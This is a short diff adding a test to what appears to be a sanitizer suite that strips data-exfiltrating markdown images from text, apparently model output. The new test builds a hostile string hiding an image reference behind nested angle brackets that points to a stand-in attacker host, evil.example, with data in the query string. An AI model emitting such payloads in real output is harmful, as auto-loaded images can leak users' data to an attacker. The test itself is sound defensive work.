@@ -155,6 +155,16 @@ def test_no_html_tag_survives_however_it_hides(form):
     assert out.startswith("앞 ") and out.endswith(" 뒤")
 
 
+@pytest.mark.parametrize("layers", [7, 8, 9, 20])
+def test_layers_deeper_than_the_rounds_still_lose_the_image(layers):
+    hostile = "!" + "<" * layers + "x>" * layers + "[a][r]\n\n> [r]: https://evil.example/x?d=S"
+
+    out = strip_exfil(hostile, "")
+
+    assert "![" not in out
+    assert not re.search(r"<[A-Za-z/!?]", out)
+
+
 def test_a_link_to_a_seen_address_keeps_its_label_and_target_through_nesting():
     out = strip_exfil("[공고 [1] 보기](https://jobs.example/p/1)", "https://jobs.example/p/1")
 
